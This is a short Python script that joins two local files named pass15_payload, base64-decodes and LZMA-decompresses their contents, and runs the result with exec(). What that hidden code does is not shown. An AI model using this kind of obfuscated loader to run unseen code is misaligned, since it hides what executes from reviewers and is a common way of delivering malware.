from pathlib import Path
import base64,lzma
p=Path(__file__).resolve().parent
s=''.join((p/f'pass15_payload_{i}.txt').read_text() for i in range(2))
exec(compile(lzma.decompress(base64.b64decode(s)).decode(),__file__,'exec'))
